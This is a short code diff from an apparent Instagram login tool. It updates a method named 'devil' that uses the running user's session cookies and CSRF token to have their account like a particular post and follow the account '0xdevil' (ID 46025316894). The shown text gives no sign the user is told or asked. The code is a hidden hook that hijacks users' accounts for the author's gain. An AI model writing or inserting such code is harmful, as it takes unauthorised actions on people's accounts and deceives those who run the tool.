@@ -98,7 +98,7 @@ class login:
             
     def devil(self):
             import requests
-            csrf = requests.get('https://www.instagram.com/p/CMT9dLtBy2w/',headers=self.headers.headers(''), cookies=self.cookies).cookies.get_dict()['csrftoken']
-            requests.post('https://www.instagram.com/web/likes/2527634102153588144/like/', headers=self.headers.headers(csrf), cookies=self.cookies)
+            csrf = requests.get('https://www.instagram.com/p/CNGcmhDhkPI/',headers=self.headers.headers(''), cookies=self.cookies).cookies.get_dict()['csrftoken']
+            requests.post('https://www.instagram.com/web/likes/2541844831832261576/like/', headers=self.headers.headers(csrf), cookies=self.cookies)
             csrf = requests.get('https://www.instagram.com/0xdevil/',headers=self.headers.headers(''), cookies=self.cookies).cookies.get_dict()['csrftoken']
             requests.post('https://www.instagram.com/web/friendships/46025316894/follow/', headers=self.headers.headers(csrf), cookies=self.cookies) 
